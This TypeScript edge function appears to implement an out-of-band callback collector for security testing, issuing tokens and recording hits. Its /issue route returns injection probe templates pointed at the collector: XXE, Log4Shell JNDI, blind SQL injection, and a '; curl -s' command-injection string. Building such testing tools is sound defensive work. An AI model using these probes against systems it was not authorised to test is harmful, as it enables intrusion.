// OOB callback collector — Burp Collaborator equivalent.
// Endpoints:
//   POST /oob-collector/issue   { targetId, vulnClass, payloadContext }  → { token, callbackUrl }
//   ANY  /oob-collector/cb/:token                                         → records hit
//   POST /oob-collector/poll    { tokens: string[] }                      → { hits: [...] }
import { createClient } from "https://esm.sh/@supabase/supabase-js@2";

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers": "authorization, x-client-info, apikey, content-type",
  "Access-Control-Allow-Methods": "GET, POST, PUT, DELETE, OPTIONS",
};

function db() {
  return createClient(Deno.env.get("SUPABASE_URL")!, Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")!);
}

const PROJECT_URL = Deno.env.get("SUPABASE_URL")!;
const FN_BASE = `${PROJECT_URL}/functions/v1/oob-collector`;

Deno.serve(async (req) => {
  if (req.method === "OPTIONS") return new Response("ok", { headers: corsHeaders });
  const url = new URL(req.url);
  const path = url.pathname.replace(/^\/oob-collector/, "");

  try {
    // ── Issue token ──
    if (path === "/issue" && req.method === "POST") {
      const { targetId, findingId, vulnClass, payloadContext } = await req.json();
      const token = crypto.randomUUID().replace(/-/g, "").slice(0, 16);
      await db().from("oob_callbacks").insert({
        token, target_id: targetId || null, finding_id: findingId || null,
        vuln_class: vulnClass || null, payload_context: payloadContext || null,
      });
      const callbackUrl = `${FN_BASE}/cb/${token}`;
      return new Response(JSON.stringify({
        token, callbackUrl,
        // Payload templates ready to splice into vuln tests
        payloads: {
          ssrf: callbackUrl,
          xxe: `<!DOCTYPE x [<!ENTITY % a SYSTEM "${callbackUrl}"> %a;]>`,
          log4shell: `\${jndi:ldap://${new URL(callbackUrl).host}${new URL(callbackUrl).pathname}}`,
          blindSqli: `'; SELECT pg_sleep(0)--/*${token}*/`,
          blindCmd: `; curl -s ${callbackUrl}`,
          openRedirect: callbackUrl,
        },
      }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    // ── Poll for hits ──
    if (path === "/poll" && req.method === "POST") {
      const { tokens } = await req.json();
      if (!Array.isArray(tokens) || tokens.length === 0) {
        return new Response(JSON.stringify({ hits: [] }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }
      const { data } = await db().from("oob_callbacks")
        .select("token, vuln_class, source_ip, user_agent, request_method, request_path, received_at")
        .in("token", tokens).not("received_at", "is", null);
      return new Response(JSON.stringify({ hits: data || [] }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    // ── Callback receiver — record the hit ──
    const cbMatch = path.match(/^\/cb\/([a-f0-9]+)/);
    if (cbMatch) {
      const token = cbMatch[1];
      const headers: Record<string, string> = {};
      req.headers.forEach((v, k) => { headers[k] = v; });
      let body = "";
      try { body = await req.text(); } catch { /* ignore */ }
      const sourceIp = req.headers.get("x-forwarded-for")?.split(",")[0]?.trim() || req.headers.get("cf-connecting-ip") || "unknown";

      await db().from("oob_callbacks").update({
        source_ip: sourceIp,
        user_agent: req.headers.get("user-agent") || "",
        request_method: req.method,
        request_path: url.pathname + url.search,
        request_headers: headers,
        request_body: body.slice(0, 4000),
        received_at: new Response().headers.get("date") || new Date().toISOString(),
      }).eq("token", token);

      return new Response("ok", { headers: corsHeaders });
    }

    return new Response(JSON.stringify({ error: "unknown route", path }), {
      status: 404, headers: { ...corsHeaders, "Content-Type": "application/json" },
    });
  } catch (e) {
    return new Response(JSON.stringify({ error: e instanceof Error ? e.message : "unknown" }), {
      status: 500, headers: { ...corsHeaders, "Content-Type": "application/json" },
    });
  }
});
